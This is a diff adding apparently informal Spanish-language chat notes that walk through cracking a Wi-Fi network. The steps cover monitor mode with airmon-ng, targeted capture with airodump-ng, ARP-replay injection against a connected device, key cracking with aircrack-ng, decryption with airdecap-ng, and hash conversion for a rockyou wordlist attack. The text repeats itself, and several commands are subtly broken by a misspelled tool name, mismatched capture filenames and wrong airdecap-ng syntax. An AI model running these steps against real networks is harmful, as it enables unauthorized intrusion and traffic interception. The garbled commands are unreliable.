@@ -1,0 +1,64 @@
+toma sudo apt-get install aircrack-ng (editado) 
+[8:56] iwconfig (ver interfaces de wifi) (editado) 
+[8:59] guardamos el codigo "wlx..." 
+[9:02] sudo service NetworkManager stop 
+[9:02] sudo airmon-ng check (editado) 
+[9:03] sudo airmon-ng check kill (si quedan proceso) (editado)  
+Habibi — ayer a las 9:04 
+sudo airmon-ng check 
+[9:04] sudo airmon-ng start wlx...  
+Habibi — ayer a las 9:22 
+sudo systemctl stop avahi-daemon (Si el quedan procesos, matar el servicio) (editado) 
+[9:27] Iwconfig (revisar si esta en modo monitor) 
+[9:28] sudo airodump-ng wlx... (editado)  
+Habibi — ayer a las 9:32 
+sudo airosump-ng -c <n-channel> --bssid <bssid> -w captura wlx... (editado) 
+[9:35] sudo aireplay-ng --arpreplay -b <bssid> -h <mac del dispositivo conectado> wlx... (editado) 
+[9:38] sudo aircrack-ng -b <mac de la estacion> capture.cap (editado)  
+Habibi — ayer a las 9:42 sudo airdecap-ng <password> captura2.cap (editado) 
+[9:43] wireshark capture2.cap (editado)  Habibi — ayer a las 9:51 Instalar HCXTOOLS  hcxpc
+sudo apt-get install aircrack-ng (editado)
+[8:56]
+iwconfig (ver interfaces de wifi) (editado)
+[8:59]
+guardamos el codigo "wlx..."
+[9:02]
+sudo service NetworkManager stop
+[9:02]
+sudo airmon-ng check (editado)
+[9:03]
+sudo airmon-ng check kill (si quedan proceso) (editado)
+
+Habibi — ayer a las 9:04
+sudo airmon-ng check
+[9:04]
+sudo airmon-ng start wlx...
+
+Habibi — ayer a las 9:22
+sudo systemctl stop avahi-daemon (Si el quedan procesos, matar el servicio) (editado)
+[9:27]
+Iwconfig (revisar si esta en modo monitor)
+[9:28]
+sudo airodump-ng wlx... (editado)
+
+Habibi — ayer a las 9:32
+sudo airosump-ng -c <n-channel> --bssid <bssid> -w captura wlx... (editado)
+[9:35]
+sudo aireplay-ng --arpreplay -b <bssid> -h <mac del dispositivo conectado> wlx... (editado)
+[9:38]
+sudo aircrack-ng -b <mac de la estacion> capture.cap (editado)
+
+Habibi — ayer a las 9:42
+sudo airdecap-ng <password> captura2.cap (editado)
+[9:43]
+wireshark capture2.cap (editado)
+
+Habibi — ayer a las 9:51
+Instalar HCXTOOLS
+
+hcxpcapngtool -o hash.hc22000 -E rockyou.mod.txt ....
+[9:51]
+Birthday attack investigar (editado)
+[9:53]
+24bits+104bits
+ahi mas ordenados
